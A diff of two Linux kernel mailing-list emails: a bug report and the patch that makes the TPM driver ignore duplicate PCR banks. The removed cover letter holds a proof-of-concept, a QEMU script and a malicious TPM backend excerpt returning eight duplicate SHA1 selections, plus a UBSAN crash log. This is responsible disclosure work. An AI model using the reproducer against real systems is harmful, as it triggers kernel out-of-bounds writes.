@@ -1,61 +1,63 @@
 Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 42CDF3C98B7
-	for <linux-integrity@vger.kernel.org>; Sat, 19 Sep 2026 08:47:16 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 322903C0607
+	for <linux-integrity@vger.kernel.org>; Sat, 19 Sep 2026 08:47:19 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789807639; cv=none; b=eHP5EDudNgjhVUQGy+A0imWnVEuD6LdG3sVv/3MNtiJnBom6lT7HgLeMSbIG+K5Hdz1h8wbdA17wwHax7l9EjUQlT1EjC6MtkN/TbZ95uaQ/oldCW+aGMJEo1zIt1E/DGdJxgqkI4BDl8VwgvMXqcm2/rYFmUYlgI+BbCM0S7EI=
+	t=1789807642; cv=none; b=E6WVX9gGIP69Dxgv0q2Up3qMNyOfjEJZ19TySlmzYG8E/+jDZWiGGeBqTLehSvSksx95XZRxAovVj54TKgCyDlppzf1xzubxE6/y6FJs5aKnp0oiBqrg4QvpK+7AYfQyz2YU2rdpyfbeL5rFwi+1dL2HNPptZqJ+cBJwE/MAJPE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789807639; c=relaxed/simple;
-	bh=a9WPN9iE+lAm7bNEniRd/gcOVCzxG3Kv97DtCBjItLE=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=JwfwNaYRDfZM+RR9TQVr78bBklQDHi8Ux1LiDrq1T3pA/ttWQiZUvNsUaz+bV8B0wLN1KKhwre93IMH6hF9AmuxxNlWgNNXJel3pYg0UgJHm2CR1W6C9acfX2lbAz09HXOfa+1Ir1e65MN+ZRG5DhhJGDKVpQER0HmkfwXRmQXI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=GIiHelpm; arc=none smtp.client-ip=74.125.227.141
+	s=arc-20240116; t=1789807642; c=relaxed/simple;
+	bh=j80gGp1mQQqYOGLc25zXbELHZ56zd+Nm2USR78qFXA8=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=uqGW5qxEJGwdwBkSBByu6vtplJt5V6yfGCGzntQV45860WnH4oeZONH9H1CY0XIm2vJ4MidGMllnbYy7Lf74yMSBry7bcexa9Q5dA9IdHWUVoGm17uf9e/zZTw3RfglfLMG5m1o+kzShcLfNpxlNfxmfe3bpey+kwxTqkR4YB04=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=P5UGpiLg; arc=none smtp.client-ip=74.125.227.141
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="GIiHelpm"
-Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-396ccd5cf03so1566244a91.1
-        for <linux-integrity@vger.kernel.org>; Sat, 19 Sep 2026 01:47:16 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="P5UGpiLg"
+Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-396ccd78e6eso580653a91.0
+        for <linux-integrity@vger.kernel.org>; Sat, 19 Sep 2026 01:47:19 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1789807635; x=1790412435; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=EoU4TIEBnDlWlBp0osoIpzr8AK5ZOErk1xmml34+EiA=;
-        b=GIiHelpmqm20hIC5S6IeNCZ3UhL+XFGAFORm3vcyAwklE9nNN4VxLcc2iqxHGTp5jE
-         h8UVrod6UGq/6MspRQ+Z+0uHXu3cRH2Zho3uql8GQyU+XTeNjUqjRcbEHqw2ak+0FuTz
-         etl2uXMQoTgwg9aiCZUBG9WW1bnKRz17a23W4171HZxtcHRGnecZXNXSycyvfvHOCI9K
-         ZRfpwxdkQDEonVLwPabeTO1UBe8+PtFnBysomZ9jMLwayFJqi/kDk/PdZzSslJEZe8wy
-         7YbMR5ZJi4K0cT2k8eWnt1EuUsQZ5EkdBP/ow6BLf467U2eCi+of14xp9MSQlBpxWCMm
-         e3Ng==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1789807635; x=1790412435;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1789807639; x=1790412439; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=EoU4TIEBnDlWlBp0osoIpzr8AK5ZOErk1xmml34+EiA=;
-        b=H2YONxE4ETrVjqosxC0yY5aFyLNQGI3L0FUbG/7IiHNkTeGkuSSet0uJZ75kmN/lQM
-         bsuSVCsUdeV/VzTinMYV14c5OWMtF31ZI3g4vLw5U51LnIiJlL5fA32idbvkinsdCfDT
-         LK96QF1BMIyoR3KvnNKgIkgZ1JM+03DigMaErPtxpbms6VQUBFq1DSmzCsa6Ds61egc+
-         6nl9njaULn4ukCTndEC20oX8Jr5uxmshtIyWA+Zuzh51TYSAWqVLBbwOg2rN69JE7Zvu
-         AvTdDTpFk84A5DIuWW+5p9F6QowwBFR0jHnUQYZ1Wj6a/7AwHplFUeSJjZGrLfjVFF18
-         ifGg==
-X-Gm-Message-State: AFuF++kqQQoNDZc2z5IQLVbNnZvXp9AQTUNoq6sZ9ZU6RqvzG0IhpnRr
-	gaPqGjZAbhFmom5fiNNTMPXpO0Btwi1QSTgRDJxwsUKBWuh/My7aP8ymVaZC2X8Q49jStQKQ
-X-Gm-Gg: AYBFou3Yx6lFLxydqMpsu5HtyEoApO1IIsbz+GQM4yrhbQlVq0sJFE2mO3Cm2hjPLCd
-	Nb2duj45VYVrV8Cp9tAe0kdOlZbWjLURPn5tS89q1wRMA/89tkkOqshub9Da/PnW/cDG/xBEQIn
-	li8P9zfFKOIPTTf+IqSLog85qBttbFs+xqdMnFmw9QHXSeAICksHuGl3/A93YB4XdwJ4lLNg8YB
-	eN13OrYJ9mVsLcYgez3KGFEccC3t4kquPWFpEzcOxkm38Ov0Fif/ZUw33pK7eLbBaTOAnuRiHjy
-	bZ6dwgdkVZbWKYfYzq9vtMdm5Z8REeOUTV4ZmvbVKOSmwDKHgeGf2RnumMFWsI6kJDRVSZN2ffp
-	TZBTdVlbIrqSo015V/tyLZavj3wn4aRJSClBZ2xSHZ8EH8r11rTF0kLIzSNULrmG/57xCCnRcKj
-	+RYW8I5CadF4QoMwQ8cY6w8pymBwVogLnnnLmZSDkAALQ6SgoZMfx9/whXoNy9yxOMS5QRxV9zD
-	4o234imMr5DiL1nR8Xkl7uEITGmUqZHYcheqJjT5kva+busUm5zwoEFfVtef3I2Qr/u5A==
-X-Received: by 2002:a17:90b:2b8c:b0:39e:b7:cbea with SMTP id 98e67ed59e1d1-39e54e3d37fmr8989849a91.18.1789807635340;
-        Sat, 19 Sep 2026 01:47:15 -0700 (PDT)
+        bh=eKrINCbjz06iI3XHAyCAb5A7LBzsyEXpm4t3U5fKalE=;
+        b=P5UGpiLgCKwdiIFY48xloNe+TX+JpH8KVHS0sicyoA6mw5cHeULZzvf4AB+3Vrtxqg
+         WB6jQcllgZi4l5VcHKYLC7zy5tVlN4EVqbwBjnEWez66u0qrnKKBOMzGh/zOFzCQ6x+U
+         7O/FSsQYI3sANdAn84dFhCuxnYVeZjOqffeGdS99FArK2k/dpqrHEIhjQVwxZS46iaFn
+         +6olXjCjAZc3XWx1SVb1D0VAlt22iJzfsCuXa6jyiMqhPZDy/f5Np75ErqoxSxAPZD64
+         bk2/SHvq7pxDJRSCfomOyAklH0hMpStEQDb/4G3z8+iLlL+lXcBFxfFdjpTvXcy4Er2u
+         HbBg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789807639; x=1790412439;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=eKrINCbjz06iI3XHAyCAb5A7LBzsyEXpm4t3U5fKalE=;
+        b=lSog+0BqRUhLOzjL8+7ifsCMtRwGEFAq0ZbppL5MUJVEL65o1DKkp6EqbxXvAp/6fo
+         m4SH34MUv5yYMvqt/R+t/bv3NdgcCD0GMgyGhleTu3tRn1C6V26USkYAvrGZspbMBoHx
+         8JGYGD4QH3UHlHkRVzNc8ndDCbQkXG/sOg0aaBi4jFIfB89GzTHGp6dT7ueiOUaY6r1m
+         H7v7H7LSSaeOOCB5tKlNvpC4m+D2gBvH2aMFQ6jn2RbBgwLpRYdMrxSzTT+UVQ+3InNE
+         vRJ8muROxkLMZ7nOAUyot1s8/+/H/tQ7HiKjebYR9u/pN81yDIKqLHAfJ+VUkNxTfqyl
+         W7mQ==
+X-Gm-Message-State: AFuF++msdpPRoSkoSJf6sIl2hSzlbEOeJPlJwk9zmrgF01bXbIek86Gc
+	KfnSyGCBo24H3sbXIU21Cwq5SaCdSVI6zpruyFeShl8FvLmkeQar4l/cHvGkww==
+X-Gm-Gg: AYBFou1QUkmZSwoStUlSGECimPcclEOaF4/IUZIwkjNrN14BKcAjO/YppHGxQZwZ6BY
+	disb4qg4IWHrJHsrbbfWGWTgnO3NEz8l84VAakJMfnD9ZmxdcPhY1brBE1TDhWvAhdG28ktggq7
+	JpN+falosNQ7/R/voK5hXiC7Hv7P2c2YG8Zyr3PgqRa2gJ5+Auc4l/u4/FXX6ChM+lliUWanOPZ
+	NCyLhXnPvkI7PY86WCtOPof5U9RqX9bNk36nWLQPoPPdcIa9bNlOY91NJ+lYRORFGI7sV8i0ETy
+	V13clQrgF+MIqnYbJD+vXpcAfZHdJcX7EONZNZlnKuIh2z2dkqmE2vVzx9dyaOJhLsPooEM15Jf
+	o8Tu9wh6FvCu4l2emiv5R4BVJSg/gwF3obeMai0tQGNYg/YEOKhaK5pOZeI9M3WBN4Fb1f+AJvN
+	/Y0tR2/3ei/2eqBjHqdReBjua+TyOcyw+fLH4CTF7sP/XOVNAqIbxGEG/vgYFrhyImV6GgG5Ajf
+	yZ77RF/s9qVIvEKKvbbGJZIkA+m+coJIjnY+y/V0psHsR6MwW+MmS28sBQm8l0pKIRwlg==
+X-Received: by 2002:a17:90b:3908:b0:39e:3d38:7ef1 with SMTP id 98e67ed59e1d1-39e5565236dmr5237971a91.10.1789807638878;
+        Sat, 19 Sep 2026 01:47:18 -0700 (PDT)
 Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6ca871edsm3492881a91.5.2026.09.19.01.47.11
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6ca871edsm3492881a91.5.2026.09.19.01.47.15
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 19 Sep 2026 01:47:14 -0700 (PDT)
+        Sat, 19 Sep 2026 01:47:18 -0700 (PDT)
 From: Yuqi Xu <xuyuqiabc@gmail.com>
 To: linux-integrity@vger.kernel.org
 Cc: Peter Huewe <peterhuewe@gmx.de>,
@@ -65,10 +67,12 @@ Cc: Peter Huewe <peterhuewe@gmx.de>,
 	Vega <vega@nebusec.ai>,
 	Ren Wei <weir@nebusec.ai>,
 	xuyq21@lenovo.com
-Subject: [PATCH 0/1] tpm: ignore duplicate PCR banks in tpm2_get_pcr_allocation
-Date: Sat, 19 Sep 2026 16:46:59 +0800
-Message-ID: <cover.1789800840.git.xuyuqiabc@gmail.com>
+Subject: [PATCH 1/1] tpm: ignore duplicate PCR banks in tpm2_get_pcr_allocation
+Date: Sat, 19 Sep 2026 16:47:00 +0800
+Message-ID: <85b8cbb1985c743325d57e05d51d8814d3c56549.1789800840.git.xuyuqiabc@gmail.com>
 X-Mailer: git-send-email 2.55.0
+In-Reply-To: <cover.1789800840.git.xuyuqiabc@gmail.com>
+References: <cover.1789800840.git.xuyuqiabc@gmail.com>
 Precedence: bulk
 X-Mailing-List: linux-integrity@vger.kernel.org
 List-Id: <linux-integrity.vger.kernel.org>
@@ -77,175 +81,63 @@ List-Unsubscribe: <mailto:linux-integrity+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+The TPM2_CAP_PCRS response is external input and may contain duplicate
+hash algorithms.  tpm2_get_pcr_allocation() adds every active selection
+to allocated_banks, while tpm_sysfs_add_device() has one group slot per
+distinct hash algorithm.  Eight duplicate selections can therefore make
+it write past chip->groups[].
 
-We found and validated an issue in drivers/char/tpm/tpm2-cmd.c.
-The bug is triggered by an attacker-controlled TPM 2.0 backend that
-returns duplicate PCR bank selections in its TPM2_CAP_PCRS response
-during device probe.
-We've tested it, and it should not affect any other functionality.
+Keep allocated_banks unique by ignoring duplicate hash algorithms while
+parsing the response.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-`struct tpm_chip` reserves `chip->groups` as an array with only
-`3 + TPM_MAX_HASHES` slots (8, with TPM_MAX_HASHES = 5).
-`tpm2_get_pcr_allocation()` parses the TPM2_CAP_PCRS response and adds
-every selection with a non-zero `pcr_select` to `chip->allocated_banks[]`.
-It rejects more than `TPM2_MAX_PCR_BANKS` (8) selections but never checks
-that the hash algorithm is unique.  `tpm_sysfs_add_device()` then stores
-the device group plus one PCR group per allocated bank with
-`chip->groups[chip->groups_cnt++]`, so eight duplicate SHA1 banks make it
-write index 8 of an 8-element array, before the trailing
-`WARN_ON(chip->groups_cnt > TPM_MAX_HASHES + 1)`.
-
-The TPM response is external input: a malicious or buggy TPM 2.0 backend
-can report the same bank eight times and drive the out-of-bounds write
-during `tpm_chip_register()` -> `tpm_sysfs_add_device()`.
-
-Keep `allocated_banks[]` unique by ignoring a selection whose hash
-algorithm has already been added; the number of distinct groups then
-matches the number of distinct hash algorithms.
-
-Reproducer:
-
- cd /root
- ./poc.sh
-
-poc.sh starts malicious_tpm.py, a small swtpm-control-protocol backend
-that answers TPM2_CAP_PCRS with eight duplicate SHA1 selections, and boots
-a kernel with `-device tpm-tis` pointing at it.
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU/KVM environment with
-CONFIG_TCG_TPM, CONFIG_TCG_TIS and CONFIG_UBSAN_BOUNDS enabled and
-panic_on_warn=1 on the kernel command line.  The test build has
-CONFIG_TCG_TPM2_HMAC disabled so the probe reaches TPM2_CAP_PCRS without
-the fake backend having to answer CREATE_PRIMARY.
-
-------BEGIN poc.sh------
-
-#!/usr/bin/env bash
-set -euo pipefail
-
-DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
-KERNEL_SRC="${1:-/home/data/data/repos/linux-repos/linux-lts-v6.12.74}"
-CTRL_SOCK="$(mktemp -u /tmp/malicious-tpm-XXXXXX.sock)"
-BACKEND_LOG="${DIR}/backend.log"
-RAW_QEMU_LOG="${DIR}/qemu-raw.log"
-QEMU_LOG="${DIR}/qemu.log"
-
-cleanup() {
-  if [[ -n "${BACKEND_PID:-}" ]] && kill -0 "${BACKEND_PID}" 2>/dev/null; then
-    kill -TERM "${BACKEND_PID}" 2>/dev/null || true
-    wait "${BACKEND_PID}" 2>/dev/null || true
-  fi
-  rm -f "${CTRL_SOCK}"
-}
-trap cleanup EXIT
-
-: > "${BACKEND_LOG}"
-
-python3 "${DIR}/malicious_tpm.py" --ctrl "${CTRL_SOCK}" --log "${BACKEND_LOG}" &
-BACKEND_PID=$!
-
-echo "backend log: ${BACKEND_LOG}"
-echo "raw qemu log: ${RAW_QEMU_LOG}"
-echo "sanitized qemu log: ${QEMU_LOG}"
-echo "The VM should exit on its own after the panic. If it does not, kill the printed pid."
-
-script -q -f "${RAW_QEMU_LOG}" -c "${DIR}/qemu-start-kernel-tpm.sh ${KERNEL_SRC} ${CTRL_SOCK}"
-perl -pe 's/\e\[[0-9;?]*[ -\/]*[@-~]//g; s/\ec//g; s/\r//g' "${RAW_QEMU_LOG}" > "${QEMU_LOG}"
-
-if grep -q 'UBSAN: array-index-out-of-bounds in ../drivers/char/tpm/tpm-sysfs.c:513:16' "${QEMU_LOG}" &&
-   grep -q 'Kernel panic - not syncing: UBSAN: panic_on_warn set' "${QEMU_LOG}"; then
-  echo "Trigger confirmed. See ${QEMU_LOG}"
-else
-  echo "Trigger not observed. See ${QEMU_LOG} and ${BACKEND_LOG}" >&2
-  exit 1
-fi
-
-------END poc.sh--------
-
-------BEGIN malicious_tpm.py excerpt------
-
-ALG_SHA1 = 0x0004
-
-def build_get_cap_pcrs():
-    entries = []
-    for _ in range(8):
-        entries.append(be16(ALG_SHA1) + b"\x03" + b"\x01\x00\x00")
-    payload = b"\x00" + be32(TPM2_CAP_PCRS) + be32(8) + b"".join(entries)
-    return build_header(TPM2_RC_SUCCESS, payload)
-
-        if cap == TPM2_CAP_PCRS:
-            return build_get_cap_pcrs()
-
-------END malicious_tpm.py excerpt------
-
-----BEGIN crash log----
-
-[    0.487531] ------------[ cut here ]------------
-[    0.487533] UBSAN: array-index-out-of-bounds in /home/lucas/work/net-tpm-675/drivers/char/tpm/tpm-sysfs.c:517:16
-[    0.487535] index 8 is out of range for type 'attribute_group *[8]'
-[    0.487538] CPU: 0 UID: 0 PID: 1 Comm: swapper/0 Not tainted 7.3.0-rc3-00322-gab411db3c3b1 #2 PREEMPT(lazy) 
-[    0.487541] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.17.0-10.fc44 06/10/2025
-[    0.487542] Call Trace:
-[    0.487553]  <TASK>
-[    0.487555]  dump_stack_lvl+0x4d/0x70
-[    0.487561]  ubsan_epilogue+0x5/0x2b
-[    0.487564]  __ubsan_handle_out_of_bounds.cold+0x4e/0x58
-[    0.487567]  tpm_sysfs_add_device+0x29f/0x380
-[    0.487573]  tpm_chip_register+0x3d/0x1e0
-[    0.487576]  ? srso_alias_return_thunk+0x5/0xfbef5
-[    0.487579]  ? srso_alias_return_thunk+0x5/0xfbef5
-[    0.487580]  tpm_tis_core_init.cold+0x1bc/0x3a1
-[    0.487584]  tpm_tis_plat_probe+0x101/0x130
-[    0.487588]  ? srso_alias_return_thunk+0x5/0xfbef5
-[    0.487590]  platform_probe+0x74/0xc0
-[    0.487594]  ? driver_sysfs_add+0x50/0x80
-[    0.487596]  really_probe+0xdd/0x290
-[    0.487597]  ? srso_alias_return_thunk+0x5/0xfbef5
-[    0.487599]  __driver_probe_device+0x99/0x180
-[    0.487601]  ? __pfx___driver_attach+0x10/0x10
-[    0.487602]  driver_probe_device+0x1a/0xa0
-[    0.487604]  ? __pfx___driver_attach+0x10/0x10
-[    0.487605]  __driver_attach+0xab/0x180
-[    0.487607]  ? srso_alias_return_thunk+0x5/0xfbef5
-[    0.487608]  bus_for_each_dev+0x92/0xf0
-[    0.487611]  bus_add_driver+0x104/0x220
-[    0.487613]  ? __pfx_init_tis+0x10/0x10
-[    0.487617]  driver_register+0x70/0xe0
-[    0.487619]  init_tis+0x9b/0xf0
-[    0.487623]  do_one_initcall+0x84/0x260
-[    0.487626]  kernel_init_freeable+0x249/0x2c0
-[    0.487630]  ? __pfx_kernel_init+0x10/0x10
-[    0.487633]  kernel_init+0x1b/0x140
-[    0.487635]  ? __pfx_kernel_init+0x10/0x10
-[    0.487637]  ret_from_fork+0x196/0x260
-[    0.487640]  ? __pfx_kernel_init+0x10/0x10
-[    0.487641]  ? __pfx_kernel_init+0x10/0x10
-[    0.487643]  ret_from_fork_asm+0x1a/0x30
-[    0.487646]  </TASK>
-[    0.487647] ---[ end trace ]---
-[    0.487648] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
-
------END crash log-----
-
-Best regards,
-Yuqi Xu
-
-Yuqi Xu (1):
-  tpm: ignore duplicate PCR banks in tpm2_get_pcr_allocation
-
+Fixes: aab73d952402 ("tpm: add sysfs exports for all banks of PCR registers")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: LLM
+Signed-off-by: Yuqi Xu <xuyuqiabc@gmail.com>
+Reviewed-by: Ren Wei <weir@nebusec.ai>
+---
  drivers/char/tpm/tpm2-cmd.c | 18 +++++++++++++-----
  1 file changed, 13 insertions(+), 5 deletions(-)
 
-
-base-commit: ab411db3c3b1fd0c70a36fb32c96b2c60175210b
+diff --git a/drivers/char/tpm/tpm2-cmd.c b/drivers/char/tpm/tpm2-cmd.c
+index ae22295df798..99e9d89b18e1 100644
+--- a/drivers/char/tpm/tpm2-cmd.c
++++ b/drivers/char/tpm/tpm2-cmd.c
+@@ -527,6 +527,7 @@ ssize_t tpm2_get_pcr_allocation(struct tpm_chip *chip)
+ 	u32 rsp_len;
+ 	int rc;
+ 	int i = 0;
++	int j;
+ 
+ 	struct tpm_buf *buf __free(kfree) = kzalloc(TPM_BUFSIZE, GFP_KERNEL);
+ 	if (!buf)
+@@ -569,13 +570,20 @@ ssize_t tpm2_get_pcr_allocation(struct tpm_chip *chip)
+ 		pcr_select_offset = memchr_inv(pcr_selection.pcr_select, 0,
+ 					       pcr_selection.size_of_select);
+ 		if (pcr_select_offset) {
+-			chip->allocated_banks[nr_alloc_banks].alg_id = hash_alg;
++			for (j = 0; j < nr_alloc_banks; j++) {
++				if (chip->allocated_banks[j].alg_id == hash_alg)
++					break;
++			}
+ 
+-			rc = tpm2_init_bank_info(chip, nr_alloc_banks);
+-			if (rc < 0)
+-				break;
++			if (j == nr_alloc_banks) {
++				chip->allocated_banks[nr_alloc_banks].alg_id = hash_alg;
+ 
+-			nr_alloc_banks++;
++				rc = tpm2_init_bank_info(chip, nr_alloc_banks);
++				if (rc < 0)
++					break;
++
++				nr_alloc_banks++;
++			}
+ 		}
+ 
+ 		sizeof_pcr_selection = sizeof(pcr_selection.hash_alg) +
 -- 
 2.55.0
 
